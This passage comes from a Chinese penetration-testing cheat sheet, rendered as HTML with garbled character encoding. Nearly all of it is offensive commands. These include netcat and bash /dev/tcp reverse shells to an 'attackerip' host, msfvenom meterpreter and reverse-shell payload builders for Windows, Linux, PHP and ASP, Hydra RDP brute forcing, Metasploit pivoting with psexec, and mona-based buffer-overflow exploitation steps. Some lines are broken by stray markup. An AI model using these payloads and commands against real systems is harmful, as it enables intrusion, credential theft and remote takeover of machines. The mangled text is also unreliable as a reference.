<div class="hljs code-wrapper"><pre><code class="hljs bash">hashcat -m 400 <span class="hljs-_">-a</span> 0 <span class="hljs-built_in">hash</span> /root/rockyou.txt
</code></pre></div>
<h3><span id="-nc-banner">ä½¿ç”¨ NC æŠ“å– Banner ä¿¡æ¯</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">nc <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.10</span> <span class="hljs-number">80</span>
GET / HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-symbol">Host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.10</span>
User-Agent: Mozilla/<span class="hljs-number">4.0</span>
<span class="hljs-symbol">Referrer:</span> www.example.com
<span class="hljs-params">&lt;enter&gt;</span>
<span class="hljs-params">&lt;enter&gt;</span>
</code></pre></div>
<h3><span id="-nc-windows-shell">ä½¿ç”¨ NC åœ¨ Windows ä¸Šåå¼¹ shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">c:&gt;nc -Lp 31337 -vv <span class="hljs-_">-e</span> cmd.exe
nc 192.168.0.10 31337
c:&gt;nc example.com 80 <span class="hljs-_">-e</span> cmd.exe
nc -lp 80

<p>nc -lp 31337 <span class="hljs-_">-e</span> /bin/bash<br>nc 192.168.0.10 31337<br>nc -vv -r(random) -w(<span class="hljs-built_in">wait</span>) 1 192.168.0.10 -z(i/o error) 1-1000<br></code></pre></div></p>
<h3><span id="-suidsgid-root">æŸ¥æ‰¾ SUID\SGID root æ–‡ä»¶</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># æŸ¥æ‰¾ SUID root æ–‡ä»¶</span>
find / -user root -perm <span class="hljs-number">-4000</span> -<span class="hljs-keyword">print</span>

<p><span class="hljs-comment"># æŸ¥æ‰¾ SGID root æ–‡ä»¶:</span><br>find / -group root -perm <span class="hljs-number">-2000</span> -<span class="hljs-keyword">print</span></p>
<p><span class="hljs-comment"># æŸ¥æ‰¾ SUID å’Œ SGID æ–‡ä»¶:</span><br>find / -perm <span class="hljs-number">-4000</span> -o -perm <span class="hljs-number">-2000</span> -<span class="hljs-keyword">print</span></p>
<p><span class="hljs-comment"># æŸ¥æ‰¾ä¸å±äºä»»ä½•ç”¨æˆ·çš„æ–‡ä»¶:</span><br>find / -nouser -<span class="hljs-keyword">print</span></p>
<p><span class="hljs-comment"># æŸ¥æ‰¾ä¸å±äºä»»ä½•ç”¨æˆ·ç»„çš„æ–‡ä»¶:</span><br>find / -nogroup -<span class="hljs-keyword">print</span></p>
<p><span class="hljs-comment"># æŸ¥æ‰¾è½¯è¿æ¥åŠå…¶æŒ‡å‘:</span><br>find / -type l -ls<br></code></pre></div></p>
<h3><span id="python-shell">Python shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
</code></pre></div>
<h3><span id="pythonrubyphp-http">Python\Ruby\PHP HTTP æœåŠ¡å™¨</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs xml">python2 -m SimpleHTTPServer
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port =&gt; 8888, <a href="https://image.3001.net/images/index/smilies/icon_biggrin.gif" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/index/smilies/icon_biggrin.gif" src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" srcset="/img/loading.gif" alt=":D" class="wp-smiley"></a>
<noscript><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'https://image.3001.net/images/index/smilies/icon_biggrin.gif'</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">':D'</span> <span class="hljs-attr">class</span>=<span class="hljs-string">'wp-smiley'</span> /&gt;</span></noscript> ocumentRoot =&gt; Dir.pwd).start"
php -S 0.0.0.0:8888
</code></pre></div>
<h3><span id="-pid">è·å–è¿›ç¨‹å¯¹åº”çš„ PID</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">fuser</span> -nv tcp <span class="hljs-number">80</span>
fuser -k -n tcp <span class="hljs-number">80</span>
</code></pre></div>
<h3><span id="-hydra-rdp">ä½¿ç”¨ Hydra çˆ†ç ´ RDP</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">hydra <span class="hljs-_">-l</span> admin -P /root/Desktop/passwords -S X.X.X.X rdp
</code></pre></div>
<h3><span id="-windows-2">æŒ‚è½½è¿œç¨‹ Windows å…±äº«æ–‡ä»¶å¤¹</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby">smbmount /<span class="hljs-regexp">/X.X.X.X/c</span>$ /mnt/remote/ -o username=user,password=pass,rw
</code></pre></div>
<h3><span id="kali-exploit">Kali ä¸‹ç¼–è¯‘ Exploit</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-m32</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">output32</span> <span class="hljs-selector-tag">hello</span><span class="hljs-selector-class">.c</span> (32 ä½)
<span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-m64</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">output</span> <span class="hljs-selector-tag">hello</span><span class="hljs-selector-class">.c</span> (64 ä½)
</code></pre></div>
<h3><span id="kali-windows-exploit">Kali ä¸‹ç¼–è¯‘ Windows Exploit</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs cs">wget -O mingw-<span class="hljs-keyword">get</span>-setup.exe http:<span class="hljs-comment">//sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</span>
wine mingw-<span class="hljs-keyword">get</span>-setup.exe
<span class="hljs-keyword">select</span> mingw32-<span class="hljs-keyword">base</span>
cd /root/.wine/drive_c/windows
wget http:<span class="hljs-comment">//gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</span>
cd /root/.wine/drive_c/MinGW/bin
wine gcc -o ability.exe /tmp/exploit.c -lwsock32
wine ability.exe
</code></pre></div>
<h3><span id="nasm">NASM å‘½ä»¤</span></h3>
<p>æ³¨ï¼šNASM å…¨ç§° The Netwide Assemblerï¼Œæ˜¯ä¸€æ¬¾åŸºäº80Ã—86å’Œx86-64å¹³å°çš„æ±‡ç¼–è¯­è¨€ç¼–è¯‘ç¨‹åºï¼Œå…¶è®¾è®¡åˆè¡·æ˜¯ä¸ºäº†å®ç°ç¼–è¯‘å™¨ç¨‹åºè·¨å¹³å°å’Œæ¨¡å—åŒ–çš„ç‰¹æ€§ã€‚</p>
<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">nasm</span> <span class="hljs-selector-tag">-f</span> <span class="hljs-selector-tag">bin</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">payload</span><span class="hljs-selector-class">.bin</span> <span class="hljs-selector-tag">payload</span><span class="hljs-selector-class">.asm</span>
<span class="hljs-selector-tag">nasm</span> <span class="hljs-selector-tag">-f</span> <span class="hljs-selector-tag">elf</span> <span class="hljs-selector-tag">payload</span><span class="hljs-selector-class">.asm</span>; <span class="hljs-selector-tag">ld</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">payload</span> <span class="hljs-selector-tag">payload</span><span class="hljs-selector-class">.o</span>; <span class="hljs-selector-tag">objdump</span> <span class="hljs-selector-tag">-d</span> <span class="hljs-selector-tag">payload</span>
</code></pre></div>
<h3><span id="ssh">SSH ç©¿é€</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">ssh</span> <span class="hljs-selector-tag">-D</span> 127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-pseudo">:1080</span> <span class="hljs-selector-tag">-p</span> 22 <span class="hljs-selector-tag">user</span>@<span class="hljs-keyword">IP</span>
Add socks4 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span> in /etc/proxychains.conf
proxychains commands target
</code></pre></div>
<h3><span id="ssh-2">SSH ç©¿é€ä»ä¸€ä¸ªç½‘ç»œåˆ°å¦ä¸€ä¸ªç½‘ç»œ</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -D <span class="hljs-number">127.0.0.1:1080</span> -p <span class="hljs-number">22</span> user1<span class="hljs-variable">@IP1</span>
Add socks4 <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">1080</span> in /etc/proxychains.conf
proxychains ssh -D <span class="hljs-number">127.0.0.1:1081</span> -p <span class="hljs-number">22</span> user1<span class="hljs-variable">@IP2</span>
Add socks4 <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">1081</span> in /etc/proxychains.conf
proxychains commands target
</code></pre></div>
<h3><span id="-metasploit">ä½¿ç”¨ metasploit è¿›è¡Œç©¿é€</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">route</span> add X.X.X.X <span class="hljs-number">255.255.255.0</span> <span class="hljs-number">1</span>
use auxiliary/server/socks4a
run
proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=<span class="hljs-number">443</span> RHOST=IP E

<p>æˆ–è€…</p>
<p><span class="hljs-comment"># <a href="https://www.offensive-security.com/metasploit-unleashed/pivoting/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/pivoting/</a></span><br>meterpreter &gt; ipconfig<br>IP Address  : <span class="hljs-number">10.1.13.3</span><br>meterpreter &gt; run autoroute -s <span class="hljs-number">10.1.13.0</span>/<span class="hljs-number">24</span><br>meterpreter &gt; run autoroute -p<br><span class="hljs-number">10.1.13.0</span>          <span class="hljs-number">255.255.255.0</span>      Session <span class="hljs-number">1</span><br>meterpreter &gt; Ctrl+Z<br>msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec<br>msf exploit(psexec) &gt; set RHOST <span class="hljs-number">10.1.13.2</span><br>msf exploit(psexec) &gt; exploit<br>meterpreter &gt; ipconfig<br>IP Address  : <span class="hljs-number">10.1.13.2</span><br></code></pre></div></p>
<h3><span id="-csv-exploit-db">åŸºäº CSV æ–‡ä»¶æŸ¥è¯¢ Exploit-DB</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs perl">git clone https:<span class="hljs-regexp">//github</span>.com/offensive-security/exploit-database.git
cd exploit-database
./searchsploit â€“u
./searchsploit apache <span class="hljs-number">2.2</span>
./searchsploit <span class="hljs-string">"Linux Kernel"</span>

<p>cat files.csv | <span class="hljs-keyword">grep</span> -i linux | <span class="hljs-keyword">grep</span> -i kernel | <span class="hljs-keyword">grep</span> -i <span class="hljs-keyword">local</span> | <span class="hljs-keyword">grep</span> -v dos | uni<span class="hljs-string">q | grep 2.6 |</span> egrep <span class="hljs-string">â€œ&lt;|&lt;=â€</span> | <span class="hljs-keyword">sort</span> -k3<br></code></pre></div></p>
<h3><span id="msf-payloads">MSF Payloads</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;IP Address&gt;</span> X &gt; system.exe
msfvenom -p php<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;IP Address&gt;</span> LPORT=<span class="hljs-number">443</span> R &gt; exploit.php
msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;IP Address&gt;</span> LPORT=<span class="hljs-number">443</span> -e -a x86 --platform win -f asp -o file.asp
msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;IP Address&gt;</span> LPORT=<span class="hljs-number">443</span> -e x86/shikata_ga_nai -b <span class="hljs-string">"\x00"</span> -a x86 --platform win -f c
</code></pre></div>
<h3><span id="msf-linux-meterpreter-shell">MSF ç”Ÿæˆåœ¨ Linux ä¸‹åå¼¹çš„ Meterpreter Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 <span class="hljs-_">-e</span> <span class="hljs-_">-f</span> elf <span class="hljs-_">-a</span> x86 --platform linux -o shell
</code></pre></div>
<h3><span id="msf-shell-c-shellcode">MSF ç”Ÿæˆåå¼¹ Shell (C Shellcode)</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b <span class="hljs-string">"\x00\x0a\x0d"</span> <span class="hljs-_">-a</span> x86 --platform win <span class="hljs-_">-f</span> c
</code></pre></div>
<h3><span id="msf-python-shell">MSF ç”Ÿæˆåå¼¹ Python Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">msfvenom</span> -p cmd/unix/reverse_python LHOST=<span class="hljs-number">127.0.0.1</span> LPORT=<span class="hljs-number">443</span> -o shell.py
</code></pre></div>
<h3><span id="msf-asp-shell">MSF ç”Ÿæˆåå¼¹ ASP Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;Your IP Address&gt;</span> LPORT=<span class="hljs-params">&lt;Your Port to Connect On&gt;</span> -f asp -a x86 --platform win -o shell.asp
</code></pre></div>
<h3><span id="msf-bash-shell">MSF ç”Ÿæˆåå¼¹ Bash Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">msfvenom -p cmd<span class="hljs-meta-keyword">/unix/</span>reverse_bash LHOST=<span class="hljs-params">&lt;Your IP Address&gt;</span> LPORT=<span class="hljs-params">&lt;Your Port to Connect On&gt;</span> -o shell.sh
</code></pre></div>
<h3><span id="msf-php-shell">MSF ç”Ÿæˆåå¼¹ PHP Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs xml">msfvenom -p php/meterpreter_reverse_tcp LHOST=<span class="hljs-tag">&lt;<span class="hljs-name">Your</span> <span class="hljs-attr">IP</span> <span class="hljs-attr">Address</span>&gt;</span> LPORT=<span class="hljs-tag">&lt;<span class="hljs-name">Your</span> <span class="hljs-attr">Port</span> <span class="hljs-attr">to</span> <span class="hljs-attr">Connect</span> <span class="hljs-attr">On</span>&gt;</span> -o shell.php
add <span class="php"><span class="hljs-meta">&lt;?php</span> at the beginning
perl -i~ <span class="hljs-number">-0777</span>pe<span class="hljs-string">'s/^/&lt;?php \n/'</span> shell.php
</span></code></pre></div>
<h3><span id="msf-win-shell">MSF ç”Ÿæˆåå¼¹ Win Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">msfvenom -p windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-params">&lt;Your IP Address&gt;</span> LPORT=<span class="hljs-params">&lt;Your Port to Connect On&gt;</span> -f exe -a x86 --platform win -o shell.exe
</code></pre></div>
<h3><span id="linux">Linux å¸¸ç”¨å®‰å…¨å‘½ä»¤</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨ uid æŸ¥æ‰¾å¯¹åº”çš„ç¨‹åº</span>
find / -uid 0 -perm -4000

<p><span class="hljs-comment"># æŸ¥æ‰¾å“ªé‡Œæ‹¥æœ‰å†™æƒé™</span><br>find / -perm -o=w</p>
<p><span class="hljs-comment"># æŸ¥æ‰¾åç§°ä¸­åŒ…å«ç‚¹å’Œç©ºæ ¼çš„æ–‡ä»¶</span><br>find / -name <span class="hljs-string">â€œ â€œ</span> -print<br>find / -name <span class="hljs-string">â€œ..â€</span> -print<br>find / -name <span class="hljs-string">â€œ. â€œ</span> -print<br>find / -name <span class="hljs-string">â€œ â€œ</span> -print</p>
<p><span class="hljs-comment"># æŸ¥æ‰¾ä¸å±äºä»»ä½•äººçš„æ–‡ä»¶</span><br>find / -nouser</p>
<p><span class="hljs-comment"># æŸ¥æ‰¾æœªé“¾æ¥çš„æ–‡ä»¶</span><br>lsof +L1</p>
<p><span class="hljs-comment"># è·å–è¿›ç¨‹æ‰“å¼€ç«¯å£çš„ä¿¡æ¯</span><br>lsof -i</p>
<p><span class="hljs-comment"># çœ‹çœ‹ ARP è¡¨ä¸­æ˜¯å¦æœ‰å¥‡æ€ªçš„ä¸œè¥¿</span><br>arp <span class="hljs-_">-a</span></p>
<p><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰è´¦æˆ·</span><br>getent passwd</p>
<p><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·ç»„</span><br>getent group</p>
<p><span class="hljs-comment"># åˆ—ä¸¾æ‰€æœ‰ç”¨æˆ·çš„ crontabs</span><br><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> $(getent passwd|cut <span class="hljs-_">-f</span>1 <span class="hljs-_">-d</span>:); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">â€œ### Crontabs for <span class="hljs-variable">$user</span> ####â€</span>; crontab -u <span class="hljs-variable">$user</span> <span class="hljs-_">-l</span>; <span class="hljs-keyword">done</span></p>
<p><span class="hljs-comment"># ç”Ÿæˆéšæœºå¯†ç </span><br>cat /dev/urandom| tr -dc â€˜a-zA-Z0-9-<em>!@<span class="hljs-comment">#$%^&amp;*()</em>+{}|:&lt;&gt;?=â€™|fold -w 12| head -n 4</span></p>
<p><span class="hljs-comment"># æŸ¥æ‰¾æ‰€æœ‰ä¸å¯ä¿®æ”¹çš„æ–‡ä»¶</span><br>find . | xargs -I file lsattr <span class="hljs-_">-a</span> file 2&gt;/dev/null | grep â€˜^â€¦.iâ€™</p>
<p><span class="hljs-comment"># ä½¿æ–‡ä»¶ä¸å¯ä¿®æ”¹</span><br>chattr -i file<br></code></pre></div></p>
<h3><span id="windows">Windows ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨å‘½ä»¤</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs sql">msfvenom -p windows/shell_bind_tcp -a x86 <span class="hljs-comment">--platform win -b "\x00" -f c</span>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 <span class="hljs-comment">--platform win -e x86/shikata_ga_nai -b "\x00" -f c</span>

<p>COMMONLY USED BAD CHARACTERS:<br>\x00\x0a\x0d\x20                              For http request<br>\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)</p>
<h1 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤:"></a>å¸¸ç”¨å‘½ä»¤:</h1><p>pattern <span class="hljs-keyword">create</span><br>pattern <span class="hljs-keyword">offset</span> (EIP Address)<br>pattern <span class="hljs-keyword">offset</span> (ESP Address)<br><span class="hljs-keyword">add</span> garbage upto EIP <span class="hljs-keyword">value</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">add</span> (JMP ESP address) <span class="hljs-keyword">in</span> EIP . (ESP = shellcode )</p>
<p>!pvefindaddr pattern_create <span class="hljs-number">5000</span><br>!pvefindaddr suggest<br>!pvefindaddr modules<br>!pvefindaddr nosafeseh</p>
<p>!mona config -<span class="hljs-keyword">set</span> workingfolder <span class="hljs-keyword">C</span>:\Mona%<span class="hljs-keyword">p</span><br>!mona config -<span class="hljs-keyword">get</span> workingfolder<br>!mona <span class="hljs-keyword">mod</span><br>!mona bytearray -b <span class="hljs-string">â€œ\x00\x0aâ€</span><br>!mona pc <span class="hljs-number">5000</span><br>!mona po EIP<br>!mona suggest<br></code></pre></div></p>
<h3><span id="seh-8211">SEH â€“ ç»“æ„åŒ–å¼‚å¸¸å¤„ç†</span></h3>
<p>æ³¨ï¼šSEH(â€œStructured Exception Handlingâ€)ï¼Œå³ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼Œæ˜¯ windows æ“ä½œç³»ç»Ÿæä¾›ç»™ç¨‹åºè®¾è®¡è€…çš„å¼ºæœ‰åŠ›çš„å¤„ç†ç¨‹åºé”™è¯¯æˆ–å¼‚å¸¸çš„æ­¦å™¨ã€‚</p>
<div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># https:<span class="hljs-comment">//en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH</span></span>
<span class="hljs-meta"># http:<span class="hljs-comment">//baike.baidu.com/view/243131.htm</span></span>
!mona suggest
!mona nosafeseh
nseh=<span class="hljs-string">"\xeb\x06\x90\x90"</span> (next seh chain)
iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
</code></pre></div>
<h3><span id="rop-dep">ROP (DEP)</span></h3>
<p>æ³¨ï¼šROP(â€œReturn-Oriented Programmingâ€)æ˜¯è®¡ç®—æœºå®‰å…¨æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œè¯¥æŠ€æœ¯å…è®¸æ”»å‡»è€…åœ¨å®‰å…¨é˜²å¾¡çš„æƒ…å†µä¸‹æ‰§è¡Œä»£ç ï¼Œå¦‚ä¸å¯æ‰§è¡Œçš„å†…å­˜å’Œä»£ç ç­¾åã€‚</p>
<p>DEP(â€œData Execution Preventionâ€)æ˜¯ä¸€å¥—è½¯ç¡¬ä»¶æŠ€æœ¯ï¼Œåœ¨å†…å­˜ä¸Šä¸¥æ ¼å°†ä»£ç å’Œæ•°æ®è¿›è¡ŒåŒºåˆ†ï¼Œé˜²æ­¢æ•°æ®å½“åšä»£ç æ‰§è¡Œã€‚</p>
<div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># https:<span class="hljs-comment">//en.wikipedia.org/wiki/Return-oriented_programming</span></span>
<span class="hljs-meta"># https:<span class="hljs-comment">//zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B</span></span>
<span class="hljs-meta"># https:<span class="hljs-comment">//en.wikipedia.org/wiki/Data_Execution_Prevention</span></span>
<span class="hljs-meta"># http:<span class="hljs-comment">//baike.baidu.com/item/DEP/7694630</span></span>
!mona modules
!mona ropfunc -m *.dll -cpb <span class="hljs-string">"\x00\x09\x0a"</span>
!mona rop -m *.dll -cpb <span class="hljs-string">"\x00\x09\x0a"</span> (<span class="hljs-keyword">auto</span> suggest)
</code></pre></div>
<h3><span id="aslr-8211">ASLR â€“ åœ°å€ç©ºé—´æ ¼å±€éšæœºåŒ–</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># https:<span class="hljs-comment">//en.wikipedia.org/wiki/Address_space_layout_randomization</span></span>
<span class="hljs-meta"># http:<span class="hljs-comment">//baike.baidu.com/view/3862310.htm</span></span>
!mona noaslr
</code></pre></div>
<h3><span id="egg-hunter">å¯»è›‹(EGG Hunter)æŠ€æœ¯</span></h3>
<p>Egg huntingè¿™ç§æŠ€æœ¯å¯ä»¥è¢«å½’ä¸ºâ€œåˆ†çº§shellcodeâ€ï¼Œå®ƒä¸»è¦å¯ä»¥æ”¯æŒä½ ç”¨ä¸€å°æ®µç‰¹åˆ¶çš„shellcodeæ¥æ‰¾åˆ°ä½ çš„å®é™…çš„ï¼ˆæ›´å¤§çš„ï¼‰shellcodeï¼ˆæˆ‘ä»¬çš„â€˜é¸¡è›‹â€˜ï¼‰ï¼ŒåŸç†å°±æ˜¯é€šè¿‡åœ¨å†…å­˜ä¸­æœç´¢æˆ‘ä»¬çš„æœ€ç»ˆshellcodeã€‚æ¢å¥è¯è¯´ï¼Œä¸€æ®µçŸ­ä»£ç å…ˆæ‰§è¡Œï¼Œç„¶åå†å»å¯»æ‰¾çœŸæ­£çš„shellcodeå¹¶æ‰§è¡Œã€‚â€“ å‚è€ƒè‡ª<a href="http://www.pediy.com/kssd/pediy11/120392.html" target="_blank" rel="noopener">çœ‹é›ªè®ºå›</a>ï¼Œæ›´å¤šè¯¦æƒ…å¯ä»¥æŸ¥é˜…æˆ‘åœ¨ä»£ç æ³¨é‡Šä¸­å¢åŠ çš„é“¾æ¥ã€‚</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/</span>
<span class="hljs-comment"># http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf</span>
<span class="hljs-comment"># http://www.fuzzysecurity.com/tutorials/expDev/4.html</span>
!mona jmp -r esp
!mona egg -t lxxl
\xeb\xc4 (jump backward <span class="hljs-number">-60</span>)
buff=lxxllxxl+shell
!mona egg -t <span class="hljs-string">'w00t'</span>
</code></pre></div>
<h3><span id="gdb-debugger">GDB Debugger å¸¸ç”¨å‘½ä»¤</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># è®¾ç½®æ–­ç‚¹</span>
<span class="hljs-built_in">break</span> *_start

<p><span class="hljs-comment"># æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤</span><br>next<br>step<br>n<br>s</p>
<p><span class="hljs-comment"># ç»§ç»­æ‰§è¡Œ</span><br><span class="hljs-built_in">continue</span><br>c</p>
<p><span class="hljs-comment"># æ•°æ®</span><br>checking <span class="hljs-string">â€˜REGISTERSâ€™</span> and <span class="hljs-string">â€˜MEMORYâ€™</span></p>
<p><span class="hljs-comment"># æ˜¾ç¤ºå¯„å­˜å™¨çš„å€¼: (Decimal,Binary,Hex)</span><br><span class="hljs-built_in">print</span> /d â€“&gt; Decimal<br><span class="hljs-built_in">print</span> /t â€“&gt; Binary<br><span class="hljs-built_in">print</span> /x â€“&gt; Hex<br>O/P :<br>(gdb) <span class="hljs-built_in">print</span> /d <span class="hljs-variable">$eax</span><br><span class="hljs-variable">$17</span> = 13<br>(gdb) <span class="hljs-built_in">print</span> /t <span class="hljs-variable">$eax</span><br><span class="hljs-variable">$18</span> = 1101<br>(gdb) <span class="hljs-built_in">print</span> /x <span class="hljs-variable">$eax</span><br><span class="hljs-variable">$19</span> = 0xd<br>(gdb)</p>
<p><span class="hljs-comment"># æ˜¾ç¤ºç‰¹å®šå†…å­˜åœ°å€çš„å€¼</span><br><span class="hljs-built_in">command</span> : x/nyz (Examine)<br>n â€“&gt; Number of fields to display ==&gt;<br>y â€“&gt; Format <span class="hljs-keyword">for</span> output ==&gt; c (character) , d (decimal) , x (Hexadecimal)<br>z â€“&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)<br></code></pre></div></p>
<h3><span id="bash-shell">BASH åå¼¹ Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">bash -i &gt;&amp; <span class="hljs-meta-keyword">/dev/</span>tcp/X.X.X.X/<span class="hljs-number">443</span> <span class="hljs-number">0</span>&gt;<span class="hljs-variable">&amp;1</span>

<p>exec <span class="hljs-meta-keyword">/bin/</span>bash <span class="hljs-number">0</span><span class="hljs-variable">&amp;0</span> <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;0</span><br>exec <span class="hljs-meta-keyword">/bin/</span>bash <span class="hljs-number">0</span><span class="hljs-variable">&amp;0</span> <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;0</span></p>
<p><span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;196</span>;exec <span class="hljs-number">196</span>&lt;&gt;</span><span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">4444</span>; sh <span class="hljs-params">&lt;<span class="hljs-variable">&amp;196</span> &gt;</span><span class="hljs-variable">&amp;196</span> <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;196</span></p>
<p><span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;196</span>;exec <span class="hljs-number">196</span>&lt;&gt;</span><span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">4444</span>; sh <span class="hljs-params">&lt;<span class="hljs-variable">&amp;196</span> &gt;</span><span class="hljs-variable">&amp;196</span> <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;196</span></p>
<p>exec <span class="hljs-number">5</span><span class="hljs-params">&lt;&gt;</span><span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">4444</span> cat <span class="hljs-params">&lt;<span class="hljs-variable">&amp;5</span> | while read line; do $line <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;5</span> &gt;<span class="hljs-variable">&amp;5</span>; done <span class="hljs-meta"># or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br>exec <span class="hljs-number">5</span><span class="hljs-params">&lt;&gt;</span><span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">4444</span></p>
